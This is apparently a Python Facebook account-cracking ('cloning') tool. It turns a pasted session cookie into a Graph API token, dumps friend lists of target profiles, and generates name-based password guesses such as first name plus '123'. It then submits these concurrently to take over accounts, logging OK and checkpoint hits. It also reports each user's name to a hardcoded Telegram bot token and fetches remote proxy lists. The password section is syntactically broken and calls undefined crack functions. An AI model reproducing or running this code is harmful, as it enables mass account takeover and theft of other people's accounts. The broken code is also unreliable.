    
#-----------------[ IMPORT-MODULE ]-------------------#

import os
def modules():
	try:
		import rich , requests , bs4
	except ModuleNotFoundError:
		print("\033[1;37m [\u001b[36m•\033[1;37m] MODULE ARE BEEN INSTALLED \033[1;37m")
		os.system('pip install rich --quiet && pip install requests --quiet && pip install bs4 --quiet')
		print("\033[1;37m [\u001b[36m>>\033[1;37m] MODULE HAS BEEN INSTALLED \033[1;37m")
		print("\033[1;37m [\u001b[36m>>\033[1;37m] RERUN THE TOOL !! \033[1;37m")
	except:exit()
	exit()

import requests,bs4,json,os,sys,random,datetime,time,re,multiprocessing,socket,logging
from bs4 import BeautifulSoup as bs
from bs4 import BeautifulSoup
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from time import localtime as lt
pretty.install()
CON=sol()

#------------------[ GLOBAL VARIABLES ]-------------------#

ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
ERROR_MESSAGE = "AN ERROR OCCURRED: %s"

#------------------[ PROXY ]-------------------#

try:
	prox= requests.get('https://raw.githubusercontent.com/SUGAR-DADDY-404/proxy/master/Stock5').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	pass
prox=open('.prox.txt','r').read().splitlines()

#------------------[ USER-AGENT ]-------------------#

ugen2=[]
ugen=[]
cokbrut=[]>
ses=requests.Session()
princp=[]
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('user-agents.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/cvandeplas/pystemon/blob/master/user-agents.txt').text
		ua=open('user-agents.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('user-agents.txt','r').read().splitlines()

#------------[ INDICATION ]---------------#

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]

#------------[ WARNA-COLOR ]--------------#

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])

###----------[ ANSII COLOR STYLE ]---------- ###

Z = "\x1b[0;90m"     # Hitam
M = "\x1b[38;5;196m" # Merah
H = "\x1b[38;5;46m"  # Hijau
K = "\x1b[38;5;226m" # Kuning
B = "\x1b[38;5;44m"  # Biru
U = "\x1b[0;95m"     # Ungu
O = "\x1b[0;96m"     # Biru Muda
P = "\x1b[38;5;231m" # Putih
J = "\x1b[38;5;208m" # Jingga
A = "\x1b[38;5;248m" # Abu-Abu

###----------[ RICH COLOR STYLE ]---------- ###

Z2 = "[#000000]" # Hitam
M2 = "[#FF0000]" # Merah
H2 = "[#00FF00]" # Hijau
K2 = "[#FFFF00]" # Kuning
B2 = "[#00C8FF]" # Biru
U2 = "[#AF00FF]" # Ungu
N2 = "[#FF00FF]" # Pink
O2 = "[#00FFFF]" # Biru Muda
P2 = "[#FFFFFF]" # Putih
J2 = "[#FF8F00]" # Jingga
A2 = "[#AAAAAA]" # Abu-Abu

#--------------------[ CONVERTER-BULAN ]--------------#

dic = {'1':'JANUARY','2':'FEBRUARY','3':'MARCH','4':'APRIL','5':'MAY','6':'JUNE','7':'JULY','8':'AUGUST','9':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
dic2 = {'01':'JANUARY','02':'FEBRUARY','03':'MARCH','04':'APRIL','05':'MAY','06':'JUNE','07':'JULY','08':'AUGUST','09':'SEPTEMBER','10':'OCTOBER','11':'NOVEMBER','12':'DECEMBER'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
date = str(tgl)+'/'+str(bln)+'/'+str(thn)
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
ltx = int(lt()[3])

#------------------[ MACHINE-SUPPORT ]---------------#

def animation(u):
	for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	login()
def linex():
	print('\033[1;37m----------------------------------------------')

#------------------[ LOGO ]-----------------#

logo=("""

░░░░░██╗███████╗██████╗░██████╗░██╗░░░██╗
░░░░░██║██╔════╝██╔══██╗██╔══██╗╚██╗░██╔╝
░░░░░██║█████╗░░██████╔╝██████╔╝░╚████╔╝░
██╗░░██║██╔══╝░░██╔══██╗██╔══██╗░░╚██╔╝░░
╚█████╔╝███████╗██║░░██║██║░░██║░░░██║░░░
░╚════╝░╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░\u001b[31mv1
\033[1;37m----------------------------------------------
 GITHUB     : safal33
 FACEBOOK   : Safal Mgrx
 VERSION    :\u001b[32m 1.1\033[1;37m
 OH MY GUDDD
\033[1;37m----------------------------------------------""")

def banner():
	print(logo)

#------------------[ NAME ASK ]-------------------#

if not os.path.exists("data"):
    os.mkdir("data")
try:open("data/name.xml", "r")
except FileNotFoundError:
    open("data/name.xml", "w")
    pass
def nameask():
    os.system('clear')
    banner()
    if os.path.exists("data/name.xml") and os.path.getsize("data/name.xml") > 0:
        with open("data/name.xml", "r") as name_file_obj:
            uname = name_file_obj.readline().strip()
    else:
        print(" [\u001b[36m•\033[1;37m] ENTER YOUR FAKE NAME")
        linex()
        uname = input(" [\u001b[36m•\033[1;37m] ENTER YOUR NAME : ")
        linex()
        with open("data/name.xml", "w") as name_file_obj:
            name_file_obj.write(uname)
            print(" [\u001b[36m•\033[1;37m] NAME CHANGED VYO ABA JA ")
            exit()
try:
    with open('data/name.xml', 'r') as name_file:
        uname = name_file.readline().strip()
    if len(uname) > 1:
        pass
    else:
        nameask()
except FileNotFoundError:
    nameask()
except IOError:
    nameask()
requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=6221197589&text=THIS USER USING FREE VERSION\n" + " NAME : "+uname)

#------------------[ CONTACT ADMIN ]-------------------#

def contact():
	clear()
	banner()
	print(" [\u001b[36m1\033[1;37m] CONTACT ADMIN IN FACEBOOK")
	print(" [\u001b[36m2\033[1;37m] DIRECT SENT MESSAGE TO ADMIN")
	linex()
	admin = input(" CHOOSE : ")
	if admin in ['1']:
		os.system('xdg-open https://www.facebook.com/profile.php?id=100092839432185')
		back()
	elif admin in ['2']:
		linex()
		message = input(' [\u001b[36m•\033[1;37m] ENTER YOUR MESSAGE : ')
		requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=6221197589&text=" + "NAME : " + uname + "\nMESSAGE : " + message + "")
		linex()
		animation(" [\u001b[36m>\033[1;37m] YOUR MESSAGE HAS BEEN SENT TO ADMIN ")
		input(" [\u001b[36m>\033[1;37m] ENTER GAR JATHA ")
		back()
	elif (IOError,KeyError):
		linex()
		print(" [\u001b[36m×\033[1;37m] NO OPTION FOUND IN MENU ")
		time.sleep(2)
		back()

#--------------------[ LOGIN ]--------------#

def login123():
	login_lagi334()
def login():
	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login123()
		except requests.exceptions.ConnectionError:
			animation(f'\033[0m \u001b[36m>>\033[1;37m CHECK YOUR INTERNET CONNECTION')
			exit()
	except IOError:
		login123()

def login_lagi334():
	try:
		os.system('clear')
		banner()
		print(""" [\u001b[36m1\033[1;37m] EXTENSION : COOKIE DOUGH
 [\u001b[36m2\033[1;37m] OPEN DESKTOP MODE
 [\u001b[36m3\033[1;37m] GO TO : www.facebook.com/adsmanager
 [\u001b[36m4\033[1;37m] THEN OPEN EXTENSION COPY COOKIE""")
		linex()
		your_cookies = input(' [\u001b[36m•\033[1;37m] ENTER COOKIE : ')
		with requests.Session() as r:
			try:
				r.headers.update({'content-type': 'application/x-www-form-urlencoded',})
				data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038','scope': ''}
				response = json.loads(r.post('https://graph.facebook.com/v2.6/device/login/', data = data).text)
				code, user_code = response['code'], response['user_code']
				verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
				r.headers.pop('content-type')
				r.headers.update({'sec-fetch-mode': 'navigate','user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36','sec-fetch-site': 'cross-site','Host': 'm.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-dest': 'document',})
				response2 = r.get(verification_url, cookies = {'cookie': your_cookies}).text
				if 'How do you want to log into Facebook?' in str(response2) or '/login/?next=' in str(response2):
					linex()
					animation(f'\033[0m \u001b[36m>>\033[1;37m BISCUIT BIGRIYO NAYA HAL')
					exit()
				else:
					action = re.search('action="(.*?)">', str(response2)).group(1).replace('amp;', '')
					fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1)
					jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
					data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'qr': 0,'user_code': user_code,}
					r.headers.update({'origin': 'https://m.facebook.com','referer': verification_url,'content-type': 'application/x-www-form-urlencoded','sec-fetch-site': 'same-origin',})
					response3 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies})
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						r.headers.pop('content-type');r.headers.pop('origin')
						response4 = r.post(response3.url, data = data, cookies = {'cookie': your_cookies}).text
						action = re.search('action="(.*?)"', str(response4)).group(1).replace('amp;', '')
						fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', str(response4)).group(1)
						jazoest = re.search('name="jazoest" value="(\d+)"', str(response4)).group(1)
						scope = re.search('name="scope" value="(.*?)"', str(response4)).group(1)
						display = re.search('name="display" value="(.*?)"', str(response4)).group(1)
						user_code = re.search('name="user_code" value="(.*?)"', str(response4)).group(1)
						logger_id = re.search('name="logger_id" value="(.*?)"', str(response4)).group(1)
						auth_type = re.search('name="auth_type" value="(.*?)"', str(response4)).group(1)
						encrypted_post_body = re.search('name="encrypted_post_body" value="(.*?)"', str(response4)).group(1)
						return_format = re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)).group(1)
						r.headers.update({'origin': 'https://m.facebook.com','referer': response3.url,'content-type': 'application/x-www-form-urlencoded',})
						data = {'fb_dtsg': fb_dtsg,'jazoest': jazoest,'scope': scope,'display': display,'user_code': user_code,'logger_id': logger_id,'auth_type': auth_type,'encrypted_post_body': encrypted_post_body,'return_format[]': return_format,}
						response5 = r.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': your_cookies}).text
						windows_referer = re.search('window.location.href="(.*?)"', str(response5)).group(1).replace('\\', '')
						r.headers.pop('content-type');r.headers.pop('origin')
						r.headers.update({'referer': 'https://m.facebook.com/',})
						response6 = r.get(windows_referer, cookies = {'cookie': your_cookies}).text
						if 'Success!' in str(response6):
							r.headers.update({'sec-fetch-mode': 'no-cors','referer': 'https://graph.facebook.com/','Host': 'graph.facebook.com','accept': '*/*','sec-fetch-dest': 'script','sec-fetch-site': 'cross-site',})
							response7 = r.get(status_url, cookies = {'cookie': your_cookies}).text
							access_token = re.search('"access_token": "(.*?)"', str(response7)).group(1)
							tokenew = open("data/.token.txt","w").write(access_token)
							cook= open("data/.cok.txt","w").write(your_cookies)
							linex()
							animation(f'\033[0m \u001b[36m>>\033[1;37m LOGIN DONE RESTART');exit()
			except Exception as e:
				linex()
				animation(f'\033[0m \u001b[36m>>\033[1;37m BISCUIT BIGRIYO NAYA HAL')
				os.system('rm -rf data/.token.txt && rm -rf data/.cok.txt')
				time.sleep(1)
				back()
	except Exception as e:
		print(e)

#------------------[ MENU ]----------------#

def menu(my_name,my_id):
	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
	except IOError:
		print(' [×] INVIALD COOKIE ')
		time.sleep(5)
		login()
	clear()
	banner()
	print(" [\u001b[36m•\033[1;37m] WELCOME     : "+uname)
	print(" [\u001b[36m•\033[1;37m] TODAYS DATE : "+date)
	linex()
	print(f""" [\u001b[36m1\033[1;37m] CRACK PUBLIC       [\u001b[36m4\033[1;37m] RESET NAME""")
	print(f""" [\u001b[36m2\033[1;37m] CRACK FILE         [\u001b[36m5\033[1;37m] MESSAGE ADMIN""")
	print(f""" [\u001b[36m3\033[1;37m] CHECK RESULTS      [\u001b[36m0\033[1;37m] LOGOUT MENU""")
	linex()
	_____cowok__pink_____ = input(' CHOOSE : ')
	if _____cowok__pink_____ in ['1']:
		dump_massal()
	elif _____cowok__pink_____ in ['2']:
		crack_file()
	elif _____cowok__pink_____ in ['3','03']:
		result()
	elif _____cowok__pink_____ in ['4','04']:
		os.system('rm -rf data/name.xml')
		linex()
		animation(' [✓] NAME RESET ')
		exit()
	elif _____cowok__pink_____ in ['5','05']:
		contact()
	elif _____cowok__pink_____ in ['0']:
		os.system('rm -rf data/.token.txt')
		os.system('rm -rf data/.cookie.txt')
		linex()
		animation(' [✓] DONE LOGOUT ')
		exit()
	else:
		linex()
		animation(' [×] RMRO SNGA HAL/HER  ')
		back()

#-----------------[ CHECK-CRACK ]-----------------#

def result():
	clear()
	banner()
	print(' [\u001b[36m1\033[1;37m] CHECK CP IDZ ')
	print(' [\u001b[36m2\033[1;37m] CHECK OK IDZ ')
	print(' [\u001b[36m0\033[1;37m] EXIT ')
	linex()
	kz = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			linex()
			animation(' [\u001b[36m×\033[1;37m] FILE NOT FOUND ')
			time.sleep(3)
			back()
		if len(vin)==0:
			linex()
			animation(' [\u001b[36m•\033[1;37m] NO CP RESULTS FOUND ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					linex()
					print(' '+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(' '+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
			linex()
			geeh = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
			linex()
			try:geh = lol[geeh]
			except KeyError:
				linex()
				animation(' [\u001b[36m×\033[1;37m] NO OPTION FOUND ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				linex()
				animation(' [\u001b[36m×\033[1;37m] FILE NOT FOUND ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f' [\u001b[36m•\033[1;37m] CP : \033[33m {cpkuni[0]}|{cpkuni[1]}\033[0m')
				nocp +=1
			linex()
			input(' >> ENTER GAR JATHA  ')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			linex()
			animation(' [\u001b[36m×\033[1;37m] FILE VETENA ')
			time.sleep(2)
			back()
		if len(vin)==0:
			linex()
			animation(' [\u001b[36m•\033[1;37m] NO OK RESULTS FOUND ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					linex()
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(' '+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(' '+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
			linex()
			geeh = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
			linex()
			try:geh = lol[geeh]
			except KeyError:
				linex()
				animation(' [\u001b[36m×\033[1;37m] NO OPTION FOUND ')
				back()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				linex()
				animation(' [\u001b[36m×\033[1;37m] FILE NOT FOUND ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				print(f' [\u001b[36m•\033[1;37m] OK : \033[32m {cpkuni[0]}|{cpkuni[1]}\033[0m')
				nocp +=1
			linex()
			input(' >> ENTER GAR JTHA ')
			back()
	elif kz in ['0','00']:
		back()
	else:
		linex()
		animation(' [\u001b[36m×\033[1;37m] NO OPTION FOUND IN MENU')
		back()

#-------------------[ CRACK-PUBLIC ]----------------#

def dump_massal():
	try:
		token = open('data/.token.txt','r').read()
		cok = open('data/.cok.txt','r').read()
	except IOError:
		exit()
	try:
		linex()
		jum = int(input(' [\u001b[36m•\033[1;37m] ENTER TARGET AMOUNT  : '))
		linex()
	except ValueError:
		linex()
		animation(' [×] INVALID OPTION ')
		exit()
	if jum<1 or jum>100000000:
		linex()
		animation(' [×] TRY AGAIN ')
		back()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(' [\u001b[36m•\033[1;37m] INPUT UID '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			linex()
			animation(' [×] TRY AGAIN ')
			os.system('clear')
	try:
		linex()
		print(f' [\u001b[36m•\033[1;37m] TOTAL IDz : \u001b[32m'+str(len(id))+'\033[1;37m')
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{u}')
		back()
	except (KeyError,IOError):
		linex()
		animation(" [×] DUMP ID FAILED ")
		time.sleep(3)
		back()

#-------------[ CRACK-FROM-FILE ]------------------#

def crack_file():
	linex()
	o = input(' [\u001b[36m•\033[1;37m] FILE NAME : ')
	try:lin = open(o).read().splitlines()
	except:
		linex()
		animation(' [×] FILE NOT FOUND')
		time.sleep(2)
		back()
	for xid in lin:
		id.append(xid)
	setting()

#-------------[ ARRANGEMENT-IDZ ]---------------#

def setting():
	linex()
	print(" [\u001b[36m1\033[1;37m] ONLY OLD IDZ")
	print(" [\u001b[36m2\033[1;37m] ONLY NEW IDZ")
	print(" [\u001b[36m3\033[1;37m] BOTH MIX IDZ")
	linex()
	hu = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[] 
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	linex()
	print(" [\u001b[36m•\033[1;37m] LOGIN METHOD ")
	linex()
	print(" [\u001b[36m1\033[1;37m] METHOD 1 (BEST)")
	print(" [\u001b[36m2\033[1;37m] METHOD 2")
	linex()
	hc = input(' [\u001b[36m•\033[1;37m] CHOOSE : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['4','04']:
		method.append('free')
	else:
		method.append('mobile')
	passwrd()
	exit() 

#-------------------[ PASS-WORDLIST ]------------#

def passwrd():
	os.system('clear')
	banner()
	print(f' [\u001b[36m•\033[1;37m] TOTAL IDz : \u001b[32m',str(len(id)))
	print(" \033[1;37m[\u001b[36m•\033[1;37m] YOU STARTED CLONING AT : "+time.strftime("%H:%M"))
	linex()
	print(f" \u001b[36m>> \033[1;37m️USE NTC DATA TO CLONE")
	linex()
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(first)<3:
				if len(last)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(first+'1')
					pwv.append(first+'12')
					pwv.append(first+'123')
					pwv.append(first+'1234')
					pwv.append(first+'12345')
					pwv.append(first+'123456')
					pwv.append(first+'@123')
					pwv.append(first+'@1234')
					pwv.append(first+'@12345')
					pwv.append(last+'@123456')
					pwv.append(first+'12@')
					pwv.append(first+'123@')
					pwv.append(first+'1234@')
					pwv.append(first+'12345@')
					pwv.append(last+'123456@')
					pwv.append(first+'321')
					pwv.append('@@'+first)
					pwv.append('@'+first+'123')
					pwv.append(last+'1')
					pwv.append(last+'12')
					pwv.append(last+'123')
					pwv.append(last+'1234')
					pwv.append(last+'12345')
					pwv.append(last+'123456')
					pwv.append(last+'@123')
					pwv.append(last+'@1234')
					pwv.append(last+'@12345')
					pwv.append(last+'@123456')
					pwv.append(last+'12@')
					pwv.append(last+'123@')
					pwv.append(last+'1234@')
					pwv.append(last+'12345@')
					pwv.append(last+'123456@')
					pwv.append(last+'321')
					pwv.append('@@'+last)
					pwv.append('@'+last+'123')
					pwv.append(firstlast+'1')
					pwv.append(firstlast+'12')
					pwv.append(firstlast+'123')
					pwv.append(firstlast+'1234')
					pwv.append(firstlast+'12345')
					pwv.append(firstlast+'123456')
					pwv.append(firstlast+'@1')
					pwv.append(firstlast+'@12')
					pwv.append(firstlast+'@123')
					pwv.append(firstlast+'@1234')
					pwv.append(firstlast+'@12345')
					pwv.append(firstlast+'@123456')
					pwv.append(firstlast+'12@')
					pwv.append(firstlast+'123@')
					pwv.append(firstlast+'1234@')
					pwv.append(firstlast+'12345@')
					pwv.append(firstlast+'123456@')
					pwv.append(first last+'1')
					pwv.append(first last+'12')
					pwv.append(first last+'123')
					pwv.append(first last+'1234')
					pwv.append(first last+'12345')
					pwv.append(first last+'123456')
					pwv.append(first last+'@1')
					pwv.append(first last+'@12')
					pwv.append(first last+'@123')
					pwv.append(first last+'@1234')
					pwv.append(first last+'@12345')
					pwv.append(first last+'@123456')
					pwv.append(first last+'12@')
					pwv.append(first last+'123@')
					pwv.append(first last+'1234@')
					pwv.append(first last+'12345@')
					pwv.append(first last+'123456@')
			else:
				if len(first)<3:
				if len(last(<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(first+'1')
					pwv.append(first+'12')
					pwv.append(first+'123')
					pwv.append(first+'1234')
					pwv.append(first+'12345')
					pwv.append(first+'123456')
					pwv.append(first+'@123')
					pwv.append(first+'@1234')
					pwv.append(first+'@12345')
					pwv.append(first+'@123456')
					pwv.append(first+'12@')
					pwv.append(first+'123@')
					pwv.append(first+'1234@')
					pwv.append(first+'12345@')
					pwv.append(first+'123456@')
					pwv.append(first+'321')
					pwv.append('@@'+first)
					pwv.append('@'+frs+'123')
					pwv.append(last+'1')
					pwv.append(last+'12')
					pwv.append(last+'123')
					pwv.append(last+'1234')
					pwv.append(last+'12345')
					pwv.append(last+'123456')
					pwv.append(last+'@123')
					pwv.append(last+'@1234')
					pwv.append(last+'@12345')
					pwv.append(last+'@123456')
					pwv.append(last+'12@')
					pwv.append(last+'123@')
					pwv.append(last+'1234@')
					pwv.append(last+'12345@')
					pwv.append(last+'123456@')
					pwv.append(last+'321')
					pwv.append('@@'+last)
					pwv.append('@'+last+'123')
					pwv.append(firstlast+'1')
					pwv.append(firstlast+'12')
					pwv.append(firstlast+'123')
					pwv.append(firstlast+'1234')
					pwv.append(firstlast+'12345')
					pwv.append(firstlast+'123456')
					pwv.append(firstlast+'12@')
					pwv.append(firstlast+'123@')
					pwv.append(firstlast+'1234@')
					pwv.append(firstlast+'12345@')
					pwv.append(firstlast+'123456@')
					pwv.append(firstlast+'@1')
					pwv.append(firstlast+'@12')
					pwv.append(firstlast+'@123')
					pwv.append(firstlast+'@1234')
					pwv.append(firstlast+'@12345')
					pwv.append(firstlast+'@123456')
					pwv.append(first last+'1')
					pwv.append(first last+'12')
					pwv.append(first last+'123')
					pwv.append(first last+'1234')
					pwv.append(first last+'12345')
					pwv.append(first last+'123456')
					pwv.append(first last+'@1')
					pwv.append(first last+'@12')
					pwv.append(first last+'@123')
					pwv.append(first last+'@1234')
					pwv.append(first last+'@12345')
					pwv.append(first last+'@123456')
					pwv.append(first last+'12@')
					pwv.append(first last+'123@')
					pwv.append(first last+'1234@')
					pwv.append(first last+'12345@')
					pwv.append(first last+'123456@')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	print('\n\033[1;37m----------------------------------------------')
	print(' [\u001b[36m•\033[1;37m] CLONING COMPLETE AT '+time.strftime("%H:%M"))
	print(' [\u001b[36m•\033[1;37m] \u001b[32mOK\033[1;37m : %s '%(ok))
	print(' [\u001b[36m•\033[1;37m] \u001b[33mCP\033[1;37m : %s '%(cp))
	linex()
	woi = input(' \u001b[36m>>\033[1;37m TOOL CHALAUXAS KI CHALAUDAINAS  (y/n) : ')
